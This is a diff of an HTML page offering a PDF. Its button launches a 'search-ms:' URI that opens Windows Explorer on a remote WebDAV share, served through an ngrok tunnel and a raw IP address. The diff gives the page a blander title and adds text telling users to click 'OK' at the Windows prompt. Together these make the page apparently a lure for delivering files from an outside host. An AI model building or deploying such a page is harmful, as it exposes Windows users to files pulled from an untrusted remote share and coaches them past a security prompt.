@@ -1,34 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Trigger Search-MS for WebDAV PDF</title>
+  <title>WebDAV PDF Search</title>
 </head>
 <body>
-  <h1>Open File Search</h1>
-  <p>Click the button to search for the PDF, or <a href="http://38.247.64.82/share/LawsofHumanNature.pdf">view the PDF directly</a>.</p>
+  <h1>Open PDF Search</h1>
+  <p><a href="https://a231-38-247-64-82.ngrok-free.app/share/LawsofHumanNature.pdf">View PDF</a></p>
+  <p><strong>Note:</strong> Windows may prompt to allow the search. Click "OK".</p>
   <p id="browser-warning" style="display: none; color: red;">
-    This feature may not work in Firefox or if the WebDAV share is inaccessible. Use Chrome/Edge or the PDF link.
+    Firefox may not support this. Use Chrome/Edge or the PDF link.
   </p>
-  <button onclick="openSearch()">Search for PDF</button>
+  <button onclick="openSearch()">Search PDF</button>
   <script>
     function isFirefox() {
       return navigator.userAgent.toLowerCase().includes("firefox");
     }
 
     function openSearch() {
-      const searchUri = "search-ms:query=LawsofHumanNature&crumb=location:\\\\https://a231-38-247-64-82.ngrok-free.app@SSL\\share";
+      const searchUri = confirm('Is WebDAV mapped as a drive (e.g., Z:)?')
+        ? "search-ms:query=LawsofHumanNature&crumb=location:Z:\\"
+        : "search-ms:query=LawsofHumanNature&crumb=location:\\\\a231-38-247-64-82.ngrok-free.app@SSL\\share";
       if (isFirefox()) {
         document.getElementById("browser-warning").style.display = "block";
-        alert("Firefox may not support this feature. Try clicking the button, or use Chrome, Edge, or the PDF link.");
+        alert("Firefox may not support this. Use Chrome, Edge, or the PDF link.");
       }
       try {
         window.location.href = searchUri;
         setTimeout(() => {
-          alert("If Windows Explorer didn’t open, ensure the WebDAV share (\\\\38.247.64.82@80\\share) is accessible and contains 'LawsofHumanNature.pdf'. Try the direct PDF link.");
+          alert("If Explorer didn’t open, ensure the WebDAV share (\\\\a231-38-247-64-82.ngrok-free.app@SSL\\share) is accessible. Try mapping as a drive or use the PDF link.");
         }, 3000);
       } catch (e) {
         document.getElementById("browser-warning").style.display = "block";
-        alert("Error launching search: " + e.message + ". Check the WebDAV share or use the PDF link.");
+        alert("Error: " + e.message + ". Use the PDF link.");
       }
     }
   </script>
